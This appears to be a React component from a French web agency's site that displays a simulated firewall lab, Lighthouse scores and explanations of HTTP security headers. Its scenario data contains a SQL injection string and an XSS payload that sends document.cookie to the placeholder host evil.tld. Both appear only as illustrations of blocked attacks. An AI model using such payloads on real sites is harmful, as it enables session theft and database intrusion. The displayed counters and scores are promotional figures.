"use client";

import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  CheckCircle2,
  Cpu,
  Lock,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  Terminal,
  Zap,
} from "lucide-react";
import { Reveal } from "./reveal";
import { SpotlightCard } from "./spotlight-card";
import { EyebrowPill } from "./action-button";
import { cn } from "@/lib/utils";

interface SimulationScenario {
  id: string;
  label: string;
  vector: string;
  latency: string;
  layer: string;
  detail: string;
}

const SCENARIOS: SimulationScenario[] = [
  {
    id: "sqli",
    label: "Injection SQL",
    vector: "POST /api/contact · payload \"' OR 1=1 --\"",
    latency: "0.3 ms",
    layer: "Validation stricte + requêtes préparées",
    detail: "Requête rejetée avant tout accès base de données (HTTP 400).",
  },
  {
    id: "ddos",
    label: "Flood DDoS L7",
    vector: "Rafale 420 req/s · IP rotatives",
    latency: "0.2 ms",
    layer: "Double seau IP + plafond global mémoire",
    detail: "Quota absorbé en périphérie sans dégrader les visiteurs légitimes (HTTP 429).",
  },
  {
    id: "xss",
    label: "Payload XSS",
    vector: "<script>fetch('//evil.tld?c='+document.cookie)</script>",
    latency: "0.1 ms",
    layer: "Content-Security-Policy stricte + cookies HttpOnly",
    detail: "Exécution bloquée nativement par le navigateur + session inaccessible au JS.",
  },
  {
    id: "bruteforce",
    label: "Brute-Force Auth",
    vector: "Tentatives dictionnaire sur /api/dev/auth",
    latency: "0.4 ms",
    layer: "SHA-256 à temps constant + backoff progressif",
    detail: "Aucune fuite temporelle + verrouillage automatique de la source.",
  },
];

const HTTP_HEADERS = [
  {
    name: "Content-Security-Policy",
    grade: "Strict",
    value: "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
    impact: "Neutralise l'injection de scripts externes (XSS) et le détournement d'interface (Clickjacking).",
  },
  {
    name: "Strict-Transport-Security",
    grade: "HSTS 2 ans",
    value: "max-age=63072000; includeSubDomains; preload",
    impact: "Force le chiffrement TLS 1.3 sur toutes les connexions et empêche toute attaque de rétrogradation HTTP.",
  },
  {
    name: "Permissions-Policy",
    grade: "Verrouillé",
    value: "camera=(), microphone=(), geolocation=(), payment=()",
    impact: "Coupe l'accès silencieux aux capteurs matériels et API sensibles du navigateur.",
  },
  {
    name: "X-Content-Type-Options",
    grade: "Actif",
    value: "nosniff",
    impact: "Interdit au navigateur d'interpréter un fichier téléversé comme du code exécutable.",
  },
];

const SCORES = [
  { label: "Performance", score: 100 },
  { label: "Accessibilité", score: 100 },
  { label: "Sécurité HTTP", score: 100 },
  { label: "SEO Technique", score: 100 },
];

interface FeedItem {
  uid: number;
  time: string;
  scenario: SimulationScenario;
}

function ScoreRing({ score, label }: { score: number; label: string }) {
  const radius = 30;
  const circumference = 2 * Math.PI * radius;
  const offset = circumference - (score / 100) * circumference;

  return (
    <div className="flex flex-col items-center rounded-2xl border border-white/[0.08] bg-white/[0.025] p-4">
      <div className="relative flex size-20 items-center justify-center">
        <svg className="size-20 -rotate-90" viewBox="0 0 76 76" aria-hidden="true">
          <circle
            cx="38"
            cy="38"
            r={radius}
            fill="none"
            stroke="rgba(255,255,255,0.08)"
            strokeWidth="4"
          />
          <motion.circle
            cx="38"
            cy="38"
            r={radius}
            fill="none"
            stroke="#34d399"
            strokeWidth="4"
            strokeLinecap="round"
            strokeDasharray={circumference}
            initial={{ strokeDashoffset: circumference }}
            whileInView={{ strokeDashoffset: offset }}
            viewport={{ once: true, margin: "-40px" }}
            transition={{ duration: 0.95, ease: [0.22, 1, 0.36, 1] }}
          />
        </svg>
        <span className="font-display text-lg font-extrabold tracking-tight text-foreground">
          {score}
        </span>
      </div>
      <span className="mt-2 text-center font-mono text-[10px] uppercase tracking-[0.16em] text-muted-foreground">
        {label}
      </span>
    </div>
  );
}

/**
 * Laboratoire interactif temps réel : simulateur WAF + inspecteur d'en-têtes HTTP + jauges Lighthouse.
 */
export function CyberLab() {
  const [pulseId, setPulseId] = useState(0);
  const [blockedCount, setBlockedCount] = useState(1428);
  const [activeId, setActiveId] = useState<string>("sqli");
  const [activeHeader, setActiveHeader] = useState(0);
  const [feed, setFeed] = useState<FeedItem[]>(() => [
    { uid: 1, time: "LIVE", scenario: SCENARIOS[0]! },
    { uid: 2, time: "INIT", scenario: SCENARIOS[2]! },
  ]);

  function triggerScenario(sc: SimulationScenario) {
    const stamp = new Date().toLocaleTimeString("fr-FR", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });
    setActiveId(sc.id);
    setPulseId((n) => n + 1);
    setBlockedCount((c) => c + 1);
    setFeed((prev) => [
      { uid: Date.now() + Math.random(), time: stamp, scenario: sc },
      ...prev.slice(0, 3),
    ]);
  }

  const selectedHeader = HTTP_HEADERS[activeHeader] ?? HTTP_HEADERS[0]!;

  return (
    <section id="cyber-lab" className="section-beam relative py-20 sm:py-28">
      <div className="mx-auto max-w-6xl px-5 sm:px-8">
        <div className="grid gap-6 lg:grid-cols-[1.15fr_1fr]">
          {/* Module 1 : Simulateur d'interception WAF */}
          <Reveal className="h-full">
            <SpotlightCard
              spotlightColor="rgba(52, 211, 153, 0.09)"
              className="flex h-full flex-col p-6 sm:p-8"
            >
              <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/[0.08] pb-4">
                <div className="flex items-center gap-2.5">
                  <span className="relative flex size-2">
                    <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-emerald-400 opacity-75" />
                    <span className="relative inline-flex size-2 rounded-full bg-emerald-400" />
                  </span>
                  <span className="font-mono text-xs uppercase tracking-[0.2em] text-foreground">
                    4ur://shield-engine
                  </span>
                </div>

                <div className="flex items-center gap-2 rounded-full border border-emerald-400/25 bg-emerald-400/10 px-3 py-1 font-mono text-[11px] text-emerald-300">
                  <ShieldCheck className="size-3.5" />
                  <span>{blockedCount.toLocaleString("fr-FR")} menaces neutralisées</span>
                </div>
              </div>

              <div className="mt-5">
                <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted-foreground">
                  Injecter un vecteur d&apos;attaque simulé :
                </p>
                <div className="mt-3 grid grid-cols-2 gap-2 sm:grid-cols-4">
                  {SCENARIOS.map((sc) => {
                    const isSelected = activeId === sc.id;
                    return (
                      <button
                        key={sc.id}
                        type="button"
                        onClick={() => triggerScenario(sc)}
                        className={cn(
                          "group/btn relative flex items-center justify-center gap-1.5 rounded-full border px-3 py-2 font-mono text-[11px] transition-all active:scale-[0.97]",
                          isSelected
                            ? "border-white/30 bg-white/[0.11] font-semibold text-foreground shadow-[inset_0_1px_0_rgba(255,255,255,0.2)]"
                            : "border-white/[0.09] bg-white/[0.02] text-muted-foreground hover:border-white/25 hover:text-foreground"
                        )}
                      >
                        <ShieldAlert className="size-3.5 shrink-0 text-emerald-400" />
                        <span className="truncate">{sc.label}</span>
                      </button>
                    );
                  })}
                </div>
              </div>

              <div className="relative mt-5 flex-1 overflow-hidden rounded-2xl border border-white/[0.08] bg-[#060609] p-4">
                <AnimatePresence>
                  {pulseId > 0 && (
                    <motion.div
                      key={pulseId}
                      initial={{ opacity: 0.55, scale: 0.6 }}
                      animate={{ opacity: 0, scale: 1.85 }}
                      exit={{ opacity: 0 }}
                      transition={{ duration: 0.7, ease: "easeOut" }}
                      aria-hidden="true"
                      className="pointer-events-none absolute left-1/2 top-1/2 size-56 -translate-x-1/2 -translate-y-1/2 rounded-full border border-emerald-400/45"
                    />
                  )}
                </AnimatePresence>

                <div className="flex items-center justify-between font-mono text-[10px] uppercase tracking-[0.2em] text-muted-foreground">
                  <span className="inline-flex items-center gap-1.5">
                    <Terminal className="size-3.5 text-foreground" />
                    Inspection des paquets temps réel
                  </span>
                  <span className="text-emerald-400">Intègre</span>
                </div>

                <div className="mt-3 flex flex-col gap-2.5">
                  <AnimatePresence initial={false}>
                    {feed.map((entry) => (
                      <motion.div
                        key={entry.uid}
                        initial={{ opacity: 0, y: -8 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0 }}
                        transition={{ duration: 0.2, ease: [0.22, 1, 0.36, 1] }}
                        className="rounded-xl border border-white/[0.07] bg-white/[0.025] p-3 font-mono text-xs"
                      >
                        <div className="flex flex-wrap items-center justify-between gap-2">
                          <span className="inline-flex items-center gap-1.5 font-semibold text-emerald-400">
                            <CheckCircle2 className="size-3.5 shrink-0" />
                            BLOQUÉ · {entry.scenario.label}
                          </span>
                          <span className="rounded-full bg-white/[0.06] px-2 py-0.5 text-[10px] text-foreground">
                            {entry.scenario.latency} · {entry.time}
                          </span>
                        </div>
                        <p className="mt-1 truncate text-[11px] text-muted-foreground">
                          {entry.scenario.vector}
                        </p>
                        <p className="mt-1 text-[11px] text-foreground/85">
                          ↳ {entry.scenario.layer} — {entry.scenario.detail}
                        </p>
                      </motion.div>
                    ))}
                  </AnimatePresence>
                </div>
              </div>
            </SpotlightCard>
          </Reveal>

          {/* Module 2 : Télémétrie Core Web Vitals */}
          <Reveal delay={0.1} className="h-full">
            <SpotlightCard className="flex h-full flex-col justify-between p-6 sm:p-8">
              <div>
                <div className="flex items-center justify-between border-b border-white/[0.08] pb-4">
                  <div className="flex items-center gap-2.5">
                    <Cpu className="size-4 text-foreground" />
                    <span className="font-mono text-xs uppercase tracking-[0.2em] text-foreground">
                      Télémétrie Core Web Vitals
                    </span>
                  </div>
                  <span className="inline-flex items-center gap-1 font-mono text-[11px] text-emerald-400">
                    <Sparkles className="size-3.5" />
                    Vérifié
                  </span>
                </div>

                <div className="mt-6 grid grid-cols-2 gap-3 sm:grid-cols-4">
                  {SCORES.map((item) => (
                    <ScoreRing key={item.label} score={item.score} label={item.label} />
                  ))}
                </div>

                <div className="mt-6 rounded-2xl border border-white/[0.08] bg-white/[0.02] p-5">
                  <div className="flex items-center justify-between">
                    <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted-foreground">
                      Duel de vitesse d&apos;affichage (LCP)
                    </p>
                    <Zap className="size-3.5 text-foreground" />
                  </div>

                  <div className="mt-4 space-y-4">
                    <div>
                      <div className="flex items-center justify-between text-xs">
                        <span className="font-semibold text-foreground">
                          Architecture sur mesure 4UR
                        </span>
                        <span className="font-mono font-bold text-emerald-400">
                          0.38 s · Instantané
                        </span>
                      </div>
                      <div className="mt-1.5 h-2 w-full overflow-hidden rounded-full bg-white/[0.06]">
                        <motion.div
                          initial={{ width: 0 }}
                          whileInView={{ width: "13%" }}
                          viewport={{ once: true }}
                          transition={{ duration: 0.7, ease: [0.22, 1, 0.36, 1] }}
                          className="h-full rounded-full bg-emerald-400"
                        />
                      </div>
                    </div>

                    <div>
                      <div className="flex items-center justify-between text-xs">
                        <span className="text-muted-foreground">
                          CMS générique surchargé de plugins
                        </span>
                        <span className="font-mono text-muted-foreground">
                          3.90 s · -53 % de conversion
                        </span>
                      </div>
                      <div className="mt-1.5 h-2 w-full overflow-hidden rounded-full bg-white/[0.06]">
                        <motion.div
                          initial={{ width: 0 }}
                          whileInView={{ width: "88%" }}
                          viewport={{ once: true }}
                          transition={{ duration: 1.1, ease: [0.22, 1, 0.36, 1] }}
                          className="h-full rounded-full bg-white/25"
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <p className="mt-5 font-mono text-[11px] leading-relaxed text-muted-foreground">
                Zéro surcharge : la sécurité native s&apos;exécute côté serveur et Edge en
                moins d&apos;une milliseconde.
              </p>
            </SpotlightCard>
          </Reveal>
        </div>

        {/* Module 3 : Inspecteur interactif d'en-têtes HTTP de sécurité */}
        <Reveal delay={0.14}>
          <SpotlightCard className="mt-8 p-7 sm:p-9">
            <div className="flex flex-col justify-between gap-4 sm:flex-row sm:items-end">
              <div>
                <EyebrowPill dot="emerald">Inspecteur HTTP</EyebrowPill>
                <h3 className="mt-4 font-display text-2xl font-bold tracking-[-0.025em] sm:text-3xl">
                  Les en-têtes qui protègent chaque réponse serveur.
                </h3>
              </div>
              <p className="max-w-md text-xs leading-relaxed text-muted-foreground">
                Sélectionnez un en-tête pour inspecter la directive exacte déployée sur nos
                applications en production.
              </p>
            </div>

            <div className="mt-7 grid gap-6 lg:grid-cols-[1fr_1.3fr]">
              <div className="flex flex-col gap-2">
                {HTTP_HEADERS.map((h, idx) => {
                  const active = idx === activeHeader;
                  return (
                    <button
                      key={h.name}
                      type="button"
                      onClick={() => setActiveHeader(idx)}
                      className={cn(
                        "flex items-center justify-between rounded-2xl border px-4 py-3.5 text-left transition-all",
                        active
                          ? "border-white/25 bg-white/[0.08] text-foreground shadow-[inset_0_1px_0_rgba(255,255,255,0.14)]"
                          : "border-white/[0.07] bg-white/[0.02] text-muted-foreground hover:border-white/18 hover:text-foreground"
                      )}
                    >
                      <span className="flex items-center gap-2.5 font-mono text-xs">
                        <Lock className="size-3.5 text-emerald-400" />
                        {h.name}
                      </span>
                      <span className="rounded-full border border-emerald-400/25 bg-emerald-400/10 px-2.5 py-0.5 font-mono text-[10px] text-emerald-300">
                        {h.grade}
                      </span>
                    </button>
                  );
                })}
              </div>

              <div className="flex flex-col justify-between rounded-2xl border border-white/[0.08] bg-[#060609] p-6">
                <div>
                  <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted-foreground">
                    Directive HTTP active
                  </p>
                  <code className="mt-3 block rounded-xl border border-white/[0.07] bg-white/[0.03] p-4 font-mono text-xs leading-relaxed text-emerald-300">
                    {selectedHeader.name}: {selectedHeader.value}
                  </code>
                </div>

                <div className="mt-6 border-t border-white/[0.07] pt-4">
                  <p className="font-mono text-[10px] uppercase tracking-[0.22em] text-muted-foreground">
                    Impact défensif
                  </p>
                  <p className="mt-2 text-sm leading-relaxed text-foreground/90">
                    {selectedHeader.impact}
                  </p>
                </div>
              </div>
            </div>
          </SpotlightCard>
        </Reveal>
      </div>
    </section>
  );
}
